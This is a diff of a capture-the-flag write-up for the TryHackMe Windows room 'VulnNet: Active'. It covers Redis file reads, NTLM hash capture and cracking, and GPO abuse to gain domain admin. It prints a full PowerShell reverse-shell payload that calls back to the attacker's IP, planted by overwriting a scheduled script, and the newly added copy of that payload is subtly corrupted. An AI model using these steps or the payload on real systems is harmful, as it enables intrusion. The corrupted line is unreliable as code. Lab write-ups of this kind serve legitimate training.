@@ -1,7 +1,7 @@
 
 # VulnNet: Active
 
-![[attachments/Pasted image 20240527125137.png]]
+![](attachments/20240527125137.png)
 
 
 VulnNet Entertainment had a bad time with their previous network which suffered multiple breaches. Now they moved their entire infrastructure and hired you again as a core penetration tester. Your objective is to get full access to the system and compromise the domain.  
@@ -9,7 +9,7 @@ VulnNet Entertainment had a bad time with their previous network which suffered 
 - **Difficulty**: Medium
 - **Operating System**: Windows
 - **Platform**: Tryhackme
-- **Category**:
+- **Category**: Active Directory, SMB, Redis, Bloodhound
 
 Another Windows machine. Do your best and breach it, good luck!
 
@@ -74,17 +74,17 @@ Notable services: SMB, RPC, Redis, DNS
 
 Using `smbclient`
 
-![[attachments/Pasted image 20240527095558.png]]
+![](attachments/20240527095558.png)
 
 No shares available via anonymous login. We might have to get valid credentials later to enumerate.
 
 `enum4linux` reveals the domain to be VULNNET
 
-![[attachments/Pasted image 20240527111711.png]]
+![](attachments/20240527111711.png)
 
 `crackmapexec` reveals the FQDN to be `vulnnet.local`
 
-![[attachments/Pasted image 20240527111851.png]]
+![](attachments/20240527111851.png)
 
 we can add this entry to `/etc/hosts` file
 
@@ -92,52 +92,52 @@ we can add this entry to `/etc/hosts` file
 
 Using a tool called `redis-cli` we can get more information about the redis service running on the target.
 
-![[attachments/Pasted image 20240527100852.png]]
+![](attachments/20240527100852.png)
 
 We can search the version online for any exploit, which should lead to the github [repo](https://github.com/Ridter/redis-rce)
 
-![[attachments/Pasted image 20240527101803.png]]
+![](attachments/20240527101803.png)
 
 For this exploit to run you have to compile a redis module but the link specified in the repo is dead. You can visit [this](https://github.com/b1ngz/RedisModules-ExecuteCommand) instead. Clone the repo and run `make` to compile
 
-![[attachments/Pasted image 20240527102245.png]]
+![](attachments/20240527102245.png)
 
 After that you should see the module
 
-![[attachments/Pasted image 20240527102333.png]]
+![](attachments/20240527102333.png)
 
 Now clone this [repo](https://github.com/Ridter/redis-rce) and run the exploit to gain a shell. Make sure to specify the path to your compiled module
 
-![[attachments/Pasted image 20240527103411.png]]
+![](attachments/20240527103411.png)
 
 This exploit kept failing so i had to try [another](https://github.com/n0b0dyCN/redis-rogue-server) which also didn't work. Did a little research and found out the MODULE command doesn't exist on the redis server which is needed to upload the module we compiled
 
-![[attachments/Pasted image 20240527112425.png]]
+![](attachments/20240527112425.png)
 
 So i had to take a step back and redo my enumeration. Looking at some redis cheetsheets, i found the command `config get *`
 
-![[attachments/Pasted image 20240527112219.png]]
+![](attachments/20240527112219.png)
 
 and i was able to get a username `enterprise-security`
 
-![[attachments/Pasted image 20240527112252.png]]
+![](attachments/20240527112252.png)
 
 This will be useful later on.
 
 Going back to hacktricks also, i decided to go for the LUA sandbox bypass. You can find the line here https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
 
-![[attachments/Pasted image 20240527112618.png]]
+![](attachments/20240527112618.png)
 
 Accessing the link, we can see a way to read files from the system via the redis-server
 
-![[attachments/Pasted image 20240527113537.png]]
+![](attachments/20240527113537.png)
 
 Although in our own case we have to enclose the dotfile() in double quote for it to work. I got the idea from this post
 
-![[attachments/Pasted image 20240527114223.png]]
+![](attachments/20240527114223.png)
 
 
-![[attachments/Pasted image 20240527113802.png]]
+![](attachments/20240527113802.png)
 
 And with that we can get the first flag. Enclose the flag in THM{}.
 
@@ -145,68 +145,68 @@ Next up is to leverage this and get some vital info. Since all the commands are 
 
 First up is to start responder on your vpn interface (tun0)
 
-![[attachments/Pasted image 20240527120211.png]]
+![](attachments/20240527120211.png)
 
 Access the share via the redis server arbitrary file read exploit and capture the hash
 
-![[attachments/Pasted image 20240527120346.png]]
+![](attachments/20240527120346.png)
 
 The IP specified should be your attack vpn IP.
 
 Copy and crack the hash with hashcat. The mode is 5600
 
-![[attachments/Pasted image 20240527120523.png]]
+![](attachments/20240527120523.png)
 
-![[attachments/Pasted image 20240527120643.png]]
+![](attachments/20240527120643.png)
 
 Now we have the password for the user `enterprise-security`
 
 Trying the creds with psexec and evil-winrm doesn't work so we still have work to do
 
-![[attachments/Pasted image 20240527121843.png]]
+![](attachments/20240527121843.png)
 
-![[attachments/Pasted image 20240527121908.png]]
+![](attachments/20240527121908.png)
 # SMB Enumeration (again)
 
 Since we can't login yet, we have to perform more enumeration.
 Listing shares with smbmap using the credentials
 
-![[attachments/Pasted image 20240527122018.png]]
+![](attachments/20240527122018.png)
 
 This shows we have read and write access to the share `Enterprise-Share`
 
-![[attachments/Pasted image 20240527122427.png]]
+![](attachments/20240527122427.png)
 
 We can see there is a powershell script here. Let's download and check the contents
 
-![[attachments/Pasted image 20240527122716.png]]
+![](attachments/20240527122716.png)
 
 The script is used for removing all contents of Public user's Documents directory 
 
-![[attachments/Pasted image 20240527123014.png]]
+![](attachments/20240527123014.png)
 
 From the nature of the script, it seems like something that runs at scheduled intervals. If that is the case and we have write permissions to this share then we can create a powershell script that has the same name but it'll contain a powershell reverse shell payload. Then we overwrite the original script, setup a netcat listener and wait for our shell hopefully.
 
 The payload i will be using:
 
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient('10.8.129.243',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient('10.8.129.243',1337);$stream = $client.GetStream();[byte[)$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 Put it in a file.
 Overwrite the script 
 
-![[attachments/Pasted image 20240527124649.png]]
+![](attachments/20240527124649.png)
 
 Wait for a shell
 
-![[attachments/Pasted image 20240527125112.png]]
+![](attachments/20240527125112.png)
 
 # Privilege Escalaltion
 
 First thing as always is to check for account privileges with `whoami /all`
 
-![[attachments/Pasted image 20240527125310.png]]
+![](attachments/20240527125310.png)
 
 We have `SeImpersonatePrivilege` which can be used to escalate our privilege.
 
@@ -220,7 +220,7 @@ Transfer to the target using python server
 python -m http.server 80
 ```
 
-![[attachments/Pasted image 20240527150845.png]]
+![](attachments/20240527150845.png)
 
 ```powershell
 Invoke-WebRequest -Uri http://10.8.129.243/SharpHound.exe -OutFile C:\Users\enterprise-security\Desktop\SharpHound.exe
@@ -232,17 +232,17 @@ Run the command
 .\SharpHound.exe --CollectionMethods All --Domain DOMAIN --ExcludeDCs
 ```
 
-![[attachments/Pasted image 20240527151446.png]]
+![](attachments/20240527151446.png)
 
 Check your directory and there will be a zip file there
 
-![[attachments/Pasted image 20240527151519.png]]
+![](attachments/20240527151519.png)
 
 Transfer this to the smb share and access it on your machine to download the file
 
-![[attachments/Pasted image 20240527151751.png]]
+![](attachments/20240527151751.png)
 
-![[attachments/Pasted image 20240527151852.png]]
+![](attachments/20240527151852.png)
 
 Launch neo4j and Bloodhound
 
@@ -260,16 +260,16 @@ Hopefully you already have them setup already, if not then check a guide on how 
 
 If that doesn't work the select this icon and go to the location of the file, select all and click open
 
-![[attachments/Pasted image 20240527153814.png]]
+![](attachments/20240527153814.png)
 
 
 Next is to find the shortest path to domain admin
 
-![[attachments/Pasted image 20240527163729.png]]
+![](attachments/20240527163729.png)
 
 With this we are able to see that we have GenericWrite permission to the GPO `security-pol-vn`
 
-![[attachments/Pasted image 20240527163959.png]]
+![](attachments/20240527163959.png)
 
 We can abuse this to add our user to the administrators group using `SharpGPOAbuse`
 
@@ -279,13 +279,25 @@ SharpGPOAbuse.exe --AddComputerTask --TaskName "PrivEsc" --Author vulnnet\admini
 
 Download the binary [here](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0)
 
-![[attachments/Pasted image 20240527173646.png]]
+![](attachments/20240527173646.png)
 
 It's now done, next is to force update because we can't wait.
 
 We can confirm using `net users enterprise-security`
 
-![[attachments/Pasted image 20240527174429.png]]
+![](attachments/20240527174429.png)
 
-we are part of administrators local group membership
+we are now part of administrators local group membership
+
+But to have access to the administrator directory we will have to do it via the smb server.
+
+![](attachments/20240527215325.png)
+
+Access the `C$` share and navigate to where the administrator flag is.
+
+![](attachments/20240527215514.png)
+
+GGs
+
+![](../Breaching_Active_Directory/attachments/b1810d0bf4fbd370349d671a3f9389af.gif)
 
